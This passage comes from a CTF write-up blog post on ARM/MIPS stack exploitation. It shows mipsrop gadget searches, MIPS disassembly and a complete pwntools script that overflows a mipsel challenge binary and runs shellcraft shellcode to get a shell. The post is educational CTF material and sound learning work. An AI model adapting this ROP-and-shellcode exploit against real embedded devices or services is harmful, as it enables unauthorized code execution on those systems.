+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.tails()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x0041F518</span>  |  move $t9,$s1                                        |  jr    $s1                             |</span><br><span class="line">|  <span class="number">0x0041F538</span>  |  move $t9,$s1                                        |  jr    $s1                             |</span><br><span class="line">|  <span class="number">0x00421684</span>  |  move $t9,$a2                                        |  jr    $a2                             |</span><br><span class="line">|  <span class="number">0x0045882C</span>  |  move $t9,$v0                                        |  jr    $v0                             |</span><br><span class="line">|  <span class="number">0x00458884</span>  |  move $t9,$v0                                        |  jr    $v0                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">5</span> matching gadgets</span><br><span class="line">Python&gt;mipsrop.doubles()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x0042CB68</span>  |  move $t9,$s2                                        |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044BEA4</span>  |  move $t9,$s4                                        |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0042CB68</span>  |  move $t9,$s2                                        |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044BEA4</span>  |  move $t9,$s4                                        |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0047339C</span>  |  move $t9,$s3                                        |  jalr  $s3                             |</span><br><span class="line">|  <span class="number">0x0042CB68</span>  |  move $t9,$s2                                        |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044BEA4</span>  |  move $t9,$s4                                        |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0047339C</span>  |  move $t9,$s3                                        |  jalr  $s3                             |</span><br><span class="line">|  <span class="number">0x0042CB68</span>  |  move $t9,$s2                                        |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044BEA4</span>  |  move $t9,$s4                                        |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0047339C</span>  |  move $t9,$s3                                        |  jalr  $s3                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">11</span> matching gadgets</span><br></pre></td></tr></table></figure>
+<p>We choose the first line: <code>0x004273C4</code> using <code>$a2</code></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">004271</span>EC var_C           = -<span class="number">0xC</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004273</span>C4                 <span class="keyword">addiu </span>  $<span class="built_in">a2</span>, $<span class="built_in">sp</span>, <span class="number">0x70</span>+var_C   <span class="comment">; var_c</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004273</span>D4                 <span class="keyword">move </span>   $<span class="built_in">t9</span>, $<span class="built_in">s0</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004273</span>E8                 <span class="keyword">jalr </span>   $<span class="built_in">t9</span></span><br></pre></td></tr></table></figure>
+<p>And <code>0x00421684</code> jumping to <code>$a2</code></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00421684</span>                 <span class="keyword">move </span>   $<span class="built_in">t9</span>, $<span class="built_in">a2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00421688</span>                 <span class="keyword">jr </span>     $<span class="built_in">t9</span></span><br></pre></td></tr></table></figure>
+<p>According to these, the exploit is:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">sh = process([<span class="string">&quot;qemu-mips&quot;</span>,filename])</span><br><span class="line"><span class="comment">#sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">ra = <span class="number">0x004273C4</span> <span class="comment"># addiu $a2,$sp,0x64    	jalr $s0</span></span><br><span class="line">s0 = <span class="number">0x00421684</span> <span class="comment"># move $t9,$a2  	        jr $a2                   </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;1:&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6c</span> + p32(s0) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(ra)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x64</span> + asm(shellcraft.sh())</span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;Job.&#x27;&quot;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>This blog is just an intro with only stack exploiting tips, actually the heap challenges of <code>arm</code>/<code>mips</code> using <code>glib</code>/<code>uClibc</code>/<code>musl</code> are almost the same as these on <code>x86</code> arch.</p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/07/31/2021-07-31-Handle-Pwn-Libc-and-Host-a-Pwn/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Handle Pwn Libc and Host a Pwn</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/05/12/2021-05-12-Heap-Exploit-Intro/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Heap Exploit Intro</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Environment-Setup"><span class="nav-number">1.</span> <span class="nav-text">Environment Setup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Install-Shared-Library"><span class="nav-number">1.1.</span> <span class="nav-text">Install Shared Library</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Static-Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Static Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dynamic-Analysis"><span class="nav-number">1.3.</span> <span class="nav-text">Dynamic Analysis</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF-Examples"><span class="nav-number">2.</span> <span class="nav-text">CTF Examples</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Jarvis-oj-typo-ARM"><span class="nav-number">2.1.</span> <span class="nav-text">Jarvis oj - typo - ARM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Codegate2018-melong-ARM"><span class="nav-number">2.2.</span> <span class="nav-text">Codegate2018 - melong - ARM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shanghai2018-baby-arm-aarch64"><span class="nav-number">2.3.</span> <span class="nav-text">Shanghai2018 - baby_arm - aarch64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HWS2020-Mplogin-mipsel"><span class="nav-number">2.4.</span> <span class="nav-text">HWS2020 - Mplogin - mipsel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HWS2020-pwn-mipsel"><span class="nav-number">2.5.</span> <span class="nav-text">HWS2020 - pwn - mipsel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">3.</span> <span class="nav-text">Summary</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
